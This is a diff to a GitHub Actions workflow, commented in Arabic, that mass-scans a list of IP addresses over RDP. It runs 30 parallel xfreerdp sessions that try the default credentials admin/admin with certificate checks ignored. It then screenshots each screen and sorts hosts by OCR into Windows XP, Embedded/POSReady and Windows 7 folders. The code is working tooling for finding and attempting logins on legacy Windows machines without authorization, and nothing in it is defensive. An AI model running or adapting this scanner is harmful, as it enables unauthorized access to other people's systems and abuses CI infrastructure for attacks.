@@ -21,72 +21,73 @@ jobs:
 
       - name: Run Ultra Parallel Scan
         run: |
-          # إنشاء المجلدات لتنظيم النتائج
           mkdir -p Results/Windows_XP Results/Windows_Embedded Results/Windows_7 Results/Unknown
 
           DEFAULT_PORT=$(grep "port=" nonla.txt | cut -d'=' -f2 || echo "3389")
           LIMIT=${{ github.event.inputs.scan_limit }}
           grep -v "port=" nonla.txt | head -n "$LIMIT" > targets.tmp
 
-          # دالة الفحص المعزولة والمحسنة سريرياً
           scan_and_sort_isolated() {
             IP_PORT=$1
-            # رقم شاشة فريد لكل عملية لضمان العزل التام
             DISPLAY_NUM=$((100 + $PARALLEL_SEQ))
             export DISPLAY=:$DISPLAY_NUM
             
             IP=$(echo $IP_PORT | cut -d':' -f1)
-            PORT=$(echo $IP_PORT | grep ":" && echo $IP_PORT | cut -d':' -f2 || echo "3389")
+            PORT=$(echo $IP_PORT | grep ":" && echo $IP_PORT | cut -d':' -f2 || echo "$DEFAULT_PORT")
             
-            echo "[*] Launching Instance $PARALLEL_SEQ for $IP on $DISPLAY"
+            echo "[*] Instance $PARALLEL_SEQ -> $IP:$PORT"
 
-            # تشغيل شاشة وهمية خفيفة جداً (16-bit) لتوفير الذاكرة
+            # تشغيل الشاشة الوهمية
             Xvfb $DISPLAY -screen 0 1024x768x16 &
             X_PID=$!
-            sleep 1
+            sleep 2
             
-            # تشغيل مدير النوافذ
             fluxbox &
             FLUX_PID=$!
+            sleep 1
             
-            # تشغيل الاتصال مع تعديل الوقت لـ 30 ثانية انتظار (عبر الـ timeout)
-            # تم إضافة خيارات لتقليل استهلاك المعالج أثناء الفتح
-            timeout 40s xfreerdp /v:$IP:$PORT /cert:ignore /sec:any /size:1024x768 /u:admin /p:admin /network:auto /gfx:off -themes -wallpaper /audio-mode:2 /compression-level:2 &
+            # الأمر المصحح (تم حذف الخيارات المسببة للمشاكل واستخدام الصيغة القياسية)
+            # تم استخدام /v:$IP /port:$PORT بشكل منفصل لضمان القبول
+            timeout 45s xfreerdp /v:$IP /port:$PORT /cert:ignore /sec:any /size:1024x768 /u:admin /p:admin /network:auto /gfx:off -themes -wallpaper /audio-mode:2 &
             RDP_PID=$!
             
-            # وقت الانتظار الذي طلبته (30 ثانية)
+            # وقت الانتظار المطلوب 30 ثانية
             sleep 30
             
-            IMG_PATH="${IP}.png"
-            scrot "$IMG_PATH"
+            IMG_NAME="${IP}.png"
+            scrot "$IMG_NAME"
             
-            # إنهاء العمليات فوراً لتوفير الموارد للعمليات التالية
             kill $RDP_PID $FLUX_PID $X_PID 2>/dev/null || true
             
-            # تحليل الـ OCR لتصنيف الصور
-            if [ -f "$IMG_PATH" ]; then
-              OCR_TEXT=$(tesseract "$IMG_PATH" stdout -l eng 2>/dev/null | tr '[:upper:]' '[:lower:]')
+            if [ -f "$IMG_NAME" ]; then
+              # OCR وتحويل النص لاسم الملف والمجلد
+              OCR_TEXT=$(tesseract "$IMG_NAME" stdout -l eng 2>/dev/null | tr '[:upper:]' '[:lower:]')
+              DETECTED="Unknown"
               
               if [[ "$OCR_TEXT" == *"windows xp"* ]]; then
-                mv "$IMG_PATH" Results/Windows_XP/
+                DETECTED="XP"
+                mv "$IMG_NAME" "Results/Windows_XP/${IP}_XP.png"
               elif [[ "$OCR_TEXT" == *"embedded"* || "$OCR_TEXT" == *"posready"* || "$OCR_TEXT" == *"2009"* ]]; then
-                mv "$IMG_PATH" Results/Windows_Embedded/
+                DETECTED="Embedded"
+                mv "$IMG_NAME" "Results/Windows_Embedded/${IP}_Embedded.png"
               elif [[ "$OCR_TEXT" == *"windows 7"* ]]; then
-                mv "$IMG_PATH" Results/Windows_7/
-              elif [[ -s "$IMG_PATH" ]]; then
-                mv "$IMG_PATH" Results/Unknown/
+                DETECTED="Win7"
+                mv "$IMG_NAME" "Results/Windows_7/${IP}_Win7.png"
+              elif [[ -s "$IMG_NAME" ]]; then
+                mv "$IMG_NAME" "Results/Unknown/${IP}_Unknown.png"
               else
-                rm "$IMG_PATH"
+                rm "$IMG_NAME"
               fi
+              echo "[+] $IP Classified as: $DETECTED"
             fi
           }
 
           export -f scan_and_sort_isolated
-          # تشغيل 30 عملية متوازية في نفس الوقت (-j 30)
-          cat targets.tmp | parallel -j 30 --env DISPLAY --env PARALLEL_SEQ scan_and_sort_isolated
+          # تشغيل 30 عملية متوازية
+          cat targets.tmp | parallel -j 30 --env DISPLAY --env PARALLEL_SEQ --env DEFAULT_PORT scan_and_sort_isolated
           
       - name: Upload Results
         uses: actions/upload-artifact@v4
         with:
-          name: Ultra-Organized-Screens
+          name: Organized-Screenshots
           path: Results/
